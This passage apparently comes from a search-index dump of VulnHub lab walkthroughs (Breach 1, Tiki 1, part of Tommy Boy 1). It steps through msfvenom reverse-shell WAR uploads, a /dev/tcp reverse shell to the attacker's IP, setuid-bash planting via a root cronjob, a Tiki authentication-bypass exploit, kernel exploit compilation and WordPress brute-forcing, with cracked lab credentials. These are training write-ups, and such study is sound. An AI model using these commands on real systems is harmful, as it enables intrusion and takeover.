_JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Importing keystore keystore to ssl_cert... Enter destination keystore password: tomcat Re-enter new password: tomcat Enter source keystore password: tomcat Entry for alias tomcat successfully imported. Import command completed: 1 entries successfully imported, 0 entries failed or cancelled Decrypting &amp;amp; Analyzing SSL traffic Open pcap in wireshark wireshark _SSL_test_phase1.pcap Import key Edit -&amp;gt; Preferences -&amp;gt; TLS/SSL -&amp;gt; RSA keys list -&amp;gt; Edit -&amp;gt; Add entry &amp;amp; fill in details Filter by SSL Right-Click -&amp;gt; Follow HTTP Traffic Basic Authentication is used, meaning password is only base64 encoded Decode ┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/loot/http] └─# echo -n dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC | base64 -d tomcat:Tt\\5D8F(#!*u=G)4m7zB tomcat:Tt\\5D8F(#!*u=G)4m7zB RCE Port 8443 (HTTPS) Proceed to https://192.168.110.140:8443/cmd/cmd.jsp?cmd=id RCE did not work Proceed to https://192.168.110.140:8443/_M@nag3Me/html Login w/ tomcat:Tt\\5D8F(#!*u=G)4m7zB Create reverse shell WAR file ┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/exploit/tomcat] └─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.110.102 LPORT=4444 -f war -o rev64.war [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of war file: 1568 bytes Saved as: rev64.war Determine .jsp file ┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/exploit/tomcat] └─# jar -xvf rev64.war Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true created: META-INF/ inflated: META-INF/MANIFEST.MF created: WEB-INF/ inflated: WEB-INF/web.xml inflated: odwzawzlkdcmzy.jsp Upload it Start listener Execute reverse shell at https://192.168.110.140:8443/rev64/odwzawzlkdcmzy.jsp Privilege Escalationmilton (Creds Found) Find mysql credentials under /var/www Obtain credentials impresscms database mysql -u root SHOW databases; USE impresscms SELECT name, pass FROM i3062034b_users; ImpressCMS Admin:$23$5000$S4mancatNXCgGKpitGa5dTpN0uSo0iSIMPl3X5WdVXSEe8LILqDynHRa3R2OE5pPe-1c70c0c66700b42c4d1f2ec15638b6f5e0bbcbc03c50298ad79f765a33901709d825c9dbb98e703ea71af4bb826469fc0df5eb68e66e4192bf1651c6f06c060c Peter Gibbons:$23$5000$eemraVuhMjb0muJ8eKaIfAjJuOQorYcJ3HT0TQWVZ3XIR34Suws6rYN6uSQsQOU-5d3e3c6d93b361ca051900d8cfaecbf13c0b96fa76f525683f3a54386e04c4a68594359d15e2599f718af54fcad9a1e85d438e84da1c5af51f1fc3e185ba68a0 Michael Bolton:$23$5000$zk0tDm60SfN2vX9CJ3WuCxT3JoiwOmj99VwU3ZfuYwmKSuzhOuSDCLeedS7yhvC2-cac27699650c034aa4114fe1df04cc14e70a7dd6812a5af482e3c73f00b31595aa332242a0b67b0f58df485186d6c8176cafe1365f55097adcf15b307060d3f0 The hash cannot be identifed Obtain credentials from mysql database use mysql; SHOW tables; SELECT * from user; SELECT User, Password FROM user; mysql&amp;gt; SELECT User, Password FROM user; +------------------+-------------------------------------------+ | User | Password | +------------------+-------------------------------------------+ | root | | | milton | 6450d89bd3aff1d893b85d3ad65d2ec2 | | root | | | root | | | debian-sys-maint | *A9523939F1B2F3E72A4306C34F225ACF09590878 | +------------------+-------------------------------------------+ Crack hash milton:thelaststraw Switch user to milton tomcat6@Breach:/var/www/5446$ su milton Password: thelaststraw milton@Breach:/var/www/5446$ blumbergh (Image Forensics from earlier) Earlier, we found bill.png at /images Inside contains a comment coffeestains Switch user to blumbergh w/ blumbergh:coffeestains milton@Breach:/home$ su blumbergh Password: coffeestains blumbergh@Breach:/home$ Root (GTFO Bin) Check for sudo access for blumbergh blumbergh@Breach:/home$ sudo -l coffeestainsMatching Defaults entries for blumbergh on Breach: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User blumbergh may run the following commands on Breach: (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh blumbergh@Breach:/home$ tee has a GTFO Binary entry View contents of tidyup.sh blumbergh@Breach:/home$ cat /usr/share/cleanup/tidyup.sh #!/bin/bash #Hacker Evasion Script #Initech Cyber Consulting, LLC #Peter Gibbons and Michael Bolton - 2016 #This script is set to run every 3 minutes as an additional defense measure against hackers. cd /var/lib/tomcat6/webapps &amp;amp;&amp;amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf Likely a cronjob running as root Overwrite tidyup.sh w/ reverse shell blumbergh@Breach:/home$ printf &#39;#!/bin/bash\\n\\ncp /bin/bash /tmp/rootbash &amp;amp;&amp;amp; chmod u+s /tmp/rootbash\\n&#39; | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh; Wait for cronjob to execute /tmp/rootbash -p Flag Root (Service) Service script is writable Overwrite portly.sh printf &#39;#!/bin/bash\\n\\n/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.110.102/4444 0&amp;gt;&amp;amp;1\\n&#39; &amp;gt; /etc/init.d/portly.sh Reboot Root (kernel exploit) - Did not work Kernel version Find exploit https://github.com/offensive-security/exploitdb/blob/master/exploits/linux_x86-64/local/40871.c ┌──(root💀kali)-[~/vulnHub/Breach1/192.168.110.140/exploit/kernel] └─# searchsploit 40871.c Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &#39;AF_PACKET&#39; Race Condition Privilege Escalation Exploit mv 40871.c chocobo_root.c gcc chocobo_root.c -o chocobo_root -lpthread ./chocobo_root Failed " }, { "title": "Vulnhub - Tiki 1", "url": "/posts/Tiki-1/", "categories": "Vulnhub, Linux", "tags": "linux-priv-esc/sudo, tcp/80-http/web-app-cms-exploit", "date": "2022-01-19 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Fri Jan 21 21:48:01 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Tiki1/192.168.110.104/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Tiki1/192.168.110.104/scans/xml/_full_tcp_nmap.xml 192.168.110.104mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversNmap scan report for 192.168.110.104Host is up, received arp-response (0.00049s latency).Scanned at 2022-01-21 21:48:02 +08 for 29sNot shown: 65531 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 a3:d8:4a:89:a9:25:6d:07:c5:3d:76:28:06:ed:d1:c0 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0QOr55x/Sj6hKeR3ArLyVAPS5kzyAx8e3V2S9W44G2+SxkJ3lNn4WKgUwER8Rv3Dt1dmXfuQHXpRb7Fb9S4DoOh5kpY1PJLnvSyoe/w22YZthgar6Jf6q3XwoPFiaF9JBEJqsG0pFGFRccccasTgtCsT/2wE15L2To+WU6wPyZt2F6vOSC+yhVGOX9P0lnSbO6+1ZFIMKLDtAQU/o++PBap87c12voIkQjzC6Nyk0EVp36NKc6AIlRhAU/RIMic8ETT+f4AAiHOxoBdATL/gJcJXXyBdlWQcZe8kw26zG2kjFrcRQBM+Zj/z91H22dCQjJXmUIRIAhiVdZvL4UG4GPLigGGqAvs7ggnIw1FrQ92diFGz0ksrQfzGvXRwZqLngjdJJMuC+8lps5GZVOevYd5bQR44BLZlZXx69kagOydRMfSKw1RuZViBIDft7KZg2f9ZLlATAIYLx6+xDexE8zKvP/eyNZWELnTbQH2StPXP12tJnSNb9Jea3dXYB4Ds=| 256 e7:b2:89:05:54:57:dc:02:f4:8c:3a:7c:55:8b:51:aa (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCxghOMMgnGuE/gI+7mtcnam8ybjFNjkCsoFqkD/CRe2wWtddrl6EWKDAit3QQ9GbY8WJ4EGrJiJQogW5b7c7is=| 256 fd:77:07:2b:4a:16:3a:01:6b:e0:00:0c:0a:36:d8:2f (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILaaZ/QfOgCnog0JIRtlGUoXO3Ph+bxbcGBMBXo8w4Bz80/tcp open http syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)| http-methods: |_ Supported Methods: POST OPTIONS HEAD GET|_http-title: Apache2 Ubuntu Default Page: It works| http-robots.txt: 1 disallowed entry |_/tiki/139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2MAC Address: 08:00:27:84:8B:BD (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.6TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=1/21%OT=22%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61EOS:AB9AF%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=AOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5BOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88OS:)ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1OS:(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 15.301 days (since Thu Jan 6 14:35:14 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=262 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: 7h59m57s| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 25773/tcp): CLEAN (Couldn&#39;t connect)| Check 2 (port 41069/tcp): CLEAN (Couldn&#39;t connect)| Check 3 (port 45834/udp): CLEAN (Timeout)| Check 4 (port 41195/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| nbstat: NetBIOS name: UBUNTU, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| Names:| UBUNTU&amp;lt;00&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| UBUNTU&amp;lt;03&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| UBUNTU&amp;lt;20&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| \\x01\\x02__MSBROWSE__\\x02&amp;lt;01&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;00&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;1d&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;1e&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| Statistics:| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00| smb2-time: | date: 2022-01-21T21:48:19|_ start_date: N/ATRACEROUTEHOP RTT ADDRESS1 0.49 ms 192.168.110.104Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Jan 21 21:48:31 2022 -- 1 IP address (1 host up) scanned in 30.12 secondsTCP/139,445 (SMB)Enum4linux[*] Users via RPC on 192.168.110.104 [*] Enumerating users via &#39;querydispinfo&#39;[+] Found 1 users via &#39;querydispinfo&#39;[*] Enumerating users via &#39;enumdomusers&#39;[+] Found 1 users via &#39;enumdomusers&#39;[+] After merging user results we have 1 users total:&#39;1000&#39;: username: silky name: Silky acb: &#39;0x00000010&#39; description: &#39;&#39; User silkyCrackmapexec + SMBMap Able to read Notes fileshareTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/Tiki1/192.168.110.104]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.104/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.htaccess [Status: 403, Size: 280, Words: 20, Lines: 10].hta [Status: 403, Size: 280, Words: 20, Lines: 10] [Status: 200, Size: 10918, Words: 3499, Lines: 376].htpasswd [Status: 403, Size: 280, Words: 20, Lines: 10]index.html [Status: 200, Size: 10918, Words: 3499, Lines: 376]robots.txt [Status: 200, Size: 42, Words: 4, Lines: 4]server-status [Status: 403, Size: 280, Words: 20, Lines: 10]tiki [Status: 301, Size: 317, Words: 20, Lines: 10]:: Progress: [4614/4614] :: Job [1/1] :: 6140 req/sec :: Duration: [0:00:02] :: Errors: 0 :: robots.txt tikiInitial FootholdTCP/139,445 (SMB) Earlier, we enumerated SMB Fileshare w/ a NULL session, we have READ access to Notes fileshare Download all files in Notes fileshare &amp;amp; view its content ┌──(root💀kali)-[~/vulnHub/Tiki1/192.168.110.104/loot/smb] └─# smbclient //$ip/Notes -c &#39;prompt;recurse;mget *&#39; Enter WORKGROUP\\root&#39;s password: getting file \\Mail.txt of size 244 as Mail.txt (14.0 KiloBytes/sec) (average 14.0 KiloBytes/sec) ┌──(root💀kali)-[~/vulnHub/Tiki1/192.168.110.104/loot/smb] └─# ls Mail.txt ┌──(root💀kali)-[~/vulnHub/Tiki1/192.168.110.104/loot/smb] └─# cat Mail.txt Hi Silky because of a current Breach we had to change all Passwords, please note that it was a 0day, we don&#39;t know how he made it. Your new CMS-password is now 51lky571k1, please investigate how he made it into our Admin Panel. Cheers Boss. TCP/80 (HTTP) Proceed to /tiki Proceed to /tiki/tiki-login.php Login w/ silky:51lky571k1 Proceed to /tiki/tiki-listpages.php After looking through the History of Silky homepage, found this CVE-2020-15906 View CVE-2020-15906 - Tiki 21.1-2 https://www.exploit-db.com/exploits/48927 https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-15906 We are able to set admin’s password to a blank value after 50 failed login attempts. Search for exploits ┌──(root💀kali)-[~/vulnHub/Tiki1/192.168.110.104/loot/smb] └─# searchsploit tiki 21 ------------------------------------------------------------------------------------ Exploit Title | Path ------------------------------------------------------------------------------------ Tiki Wiki CMS Groupware 21.1 - Authentication Bypass | php/webapps/48927.py ------------------------------------------------------------------------------------ Use exploit ┌──(root💀kali)-[~/vulnHub/Tiki1/192.168.110.104/exploit/tiki-21.1] └─# python3 48927.py $ip Admin Password got removed. Use BurpSuite to login into admin without a password Login w/ admin:blank w/ Burpsuite Login w/ admin:test Intercept w/ burp and remove the password test Turn off intercept Proceed to List Pages -&amp;gt; Credentials silky:Agy8Y7SPJNXQzqA TCP/22 (SSH) SSH w/ silky:Agy8Y7SPJNXQzqAPrivilege EscalationRoot via Sudosilky@ubuntu:~$ sudo -l[sudo] Passwort für silky: Das hat nicht funktioniert, bitte nochmal probieren.[sudo] Passwort für silky: Passende Defaults-Einträge für silky auf ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binDer Benutzer silky darf die folgenden Befehle auf ubuntu ausführen: (ALL : ALL) ALLsilky@ubuntu:~$ sudo suroot@ubuntu:/home/silky# whoamirootroot@ubuntu:/home/silky# " }, { "title": "Vulnhub - Tommy Boy 1", "url": "/posts/Tommy-Boy-1/", "categories": "Vulnhub, Linux", "tags": "tcp/80-http/cms/wordpress, image-forensics, cracking/fcrackzip, linux-priv-esc/linux-creds-found", "date": "2022-01-15 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Tue Jan 18 04:38:15 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/TommyBoy1/192.168.56.129/scans/_full_tcp_nmap.txt -oX /root/vulnHub/TommyBoy1/192.168.56.129/scans/xml/_full_tcp_nmap.xml 192.168.56.129mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversadjust_timeouts2: packet supposedly had rtt of -607880 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -607880 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -608174 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -608174 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -532989 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -532989 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -532171 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -532171 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -354959 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -354959 microseconds. Ignoring time.Nmap scan report for 192.168.56.129Host is up, received arp-response (0.00076s latency).Scanned at 2022-01-18 04:38:16 +08 for 21sNot shown: 65532 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a0:ca:62:ce:f6:7e:ae:8b:62:de:0b:db:21:3f:b0:d6 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDi74A2GW2LYOIaOCt3+uBb2ecZSCL0EKylLIwMoKts0TvVdP82C/Ajp0FF2r2DjDw7QxvGtdkOiprtsyVmznzEfKnuuiBNpcBhj297sukKvVBKfDiTv51DvbeqKhQEDdZGlj2ZJWtit+EAxndPQEMs4Jr48mLjQhb/D6P78DEfKlGOlRBlaj3PVMVzNifEEhYF3pYDxbkQ4RFOILMiQGo7IOoMrxJBYYzDxwQ2dXyTElJ4++M/zGojF3wRDqLq2v35xyZWmsG+5mA93aAo7R9sFELQNzGhdHc33FapQPe/tcAO4AdCU8Ex4I20Na4T+pN73//wOwyNOO49d7pCrOP| 256 46:6d:4b:4b:02:86:89:27:28:5c:1d:87:10:55:3d:59 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBElpjsbihyk+MUGgJDx0lD/yU2pii+FxZ6jHwI6w/SyeYUDoLS50o98T0SRLJHEfAnVaR9eFAKoOI/LiBQ+UTWY=| 256 56:9e:71:2a:a3:83:ff:63:11:7e:94:08:dd:28:1d:46 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPN6HuPH7beQC1yRgoJaL+p2JhW62bu1xgCoKo4EPvFM80/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))|_http-title: Welcome to Callahan Auto| http-robots.txt: 4 disallowed entries | /6packsofb...soda /lukeiamyourfather |_/lookalivelowbridge /flag-numero-uno.txt| http-methods: |_ Supported Methods: OPTIONS GET HEAD POST|_http-server-header: Apache/2.4.18 (Ubuntu)8008/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))|_http-title: KEEP OUT| http-methods: |_ Supported Methods: OPTIONS GET HEAD POST|_http-server-header: Apache/2.4.18 (Ubuntu)MAC Address: 08:00:27:C2:EF:FB (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=1/18%OT=22%CT=1%CU=30056%PV=Y%DS=1%DC=D%G=Y%M=080027%TOS:M=61E5D3CE%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=I%II=IOS:%TS=8)SEQ(SP=104%GCD=1%ISR=109%TI=Z%II=I%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4OS:ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1OS:=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%TG=40%W=7210%OS:O=M5B4NNSNW7%CC=Y%Q=)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=OS:Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%QOS:=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T5(R=OS:Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=O%FOS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%OS:T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%ROS:D=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%TOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%TG=40%CDOS:=S)IE(R=Y%DFI=N%T=40%CD=S)Uptime guess: 199.639 days (since Fri Jul 2 13:18:43 2021)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=260 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.76 ms 192.168.56.129Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Jan 18 04:38:38 2022 -- 1 IP address (1 host up) scanned in 23.01 secondsTCP/80 (HTTP)FFUF - common.txt┌──(root💀kali)-[~/vulnHub/TommyBoy1]└─# ffuf -u http://192.168.56.129/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 301 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.56.129/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 301________________________________________________.hta [Status: 403, Size: 293, Words: 22, Lines: 12] [Status: 200, Size: 1176, Words: 164, Lines: 18].htaccess [Status: 403, Size: 298, Words: 22, Lines: 12].htpasswd [Status: 403, Size: 298, Words: 22, Lines: 12]cgi-bin/ [Status: 200, Size: 745, Words: 52, Lines: 16]index.html [Status: 200, Size: 1176, Words: 164, Lines: 18]robots.txt [Status: 200, Size: 132, Words: 6, Lines: 6]server-status [Status: 403, Size: 302, Words: 22, Lines: 12]:: Progress: [4614/4614] :: Job [1/1] :: 429 req/sec :: Duration: [0:00:04] :: Errors: 0 ::TCP/8008 (HTTP)FFUF - common.txt┌──(root💀kali)-[~/vulnHub/TommyBoy1]└─# ffuf -u http://192.168.56.129:8008/FUZZ -w /usr/share/wordlists/dirb/common.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.56.129:8008/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.htaccess [Status: 403, Size: 300, Words: 22, Lines: 12].htpasswd [Status: 403, Size: 300, Words: 22, Lines: 12].hta [Status: 403, Size: 295, Words: 22, Lines: 12] [Status: 200, Size: 295, Words: 35, Lines: 13]index.html [Status: 200, Size: 295, Words: 35, Lines: 13]server-status [Status: 403, Size: 304, Words: 22, Lines: 12]:: Progress: [4614/4614] :: Job [1/1] :: 4853 req/sec :: Duration: [0:00:01] :: Errors: 0 ::Obtaining Initial FootholdTCP/80 (HTTP) - Image Forensics + Wordpress (Protected Post Bruteforce) Proceed to /robots ┌──(root💀kali)-[~/vulnHub/TommyBoy1] └─# curl http://192.168.56.129/robots.txt User-agent: * Disallow: /6packsofb...soda Disallow: /lukeiamyourfather Disallow: /lookalivelowbridge Disallow: /flag-numero-uno.txt Proceed to directories in robots.txt /6packsofb...soda /lukeiamyourfather /lookalivelowbridge /flag-numero-uno.txt (Found 1st Flag) B34rcl4ws Check for any hidden files binwalk -eM * No hidden files Proceed to index.html &amp;amp; view page source Mentioned that hidden web dir can be found in a youtube video Found hidden web directory /prehistoricforest Enumerate wp users wpscan --no-update --disable-tls-checks --url http://tommyboy/prehistoricforest/ -e u -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/TommyBoy1/192.168.56.129/scans/tcp80/tcp_80_http_wpscan_users_enum.txt&quot; [+] URL: http://tommyboy/prehistoricforest/ [192.168.56.129][i] User(s) Identified:[+] michelle | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] richard | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] tom | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] tommy | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) Store them in a wordlist Enumerate wp plugins wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://tommyboy/prehistoricforest/ -e ap -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/TommyBoy1/192.168.56.129/scans/tcp80/tcp_80_http_wpscan_plugin_enum.txt&quot; [i] Plugin(s) Identified: [+] akismet | Location: http://tommyboy/prehistoricforest/wp-content/plugins/akismet/ | Latest Version: 4.2.1 | Last Updated: 2021-10-01T18:28:00.000Z | | Found By: Known Locations (Aggressive Detection) | - http://tommyboy/prehistoricforest/wp-content/plugins/akismet/, status: 403 | | The version could not be determined. Not exploitable Bruteforce wpscan --no-update --disable-tls-checks --wp-content-dir wp-admin --url http://tommyboy/prehistoricforest/ --usernames usernames.txt --passwords /usr/share/wordlists/rockyou.txt -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/TommyBoy1/192.168.56.129/scans/tcp80/tcp_80_http_wpscan_bruteforce.txt&quot; While bruteforcing, look for useful information in the wordpress blog Found 2nd Flag Proceed to “Son OF A!” Post Proceed to /richard &amp;amp; download image Check for hidden files/text ┌──(root💀kali)-[~/vulnHub/TommyBoy1/192.168.56.129/loot/http]└─# exiftool shockedrichard.jpg |grep &quot;User Comment&quot;User Comment : 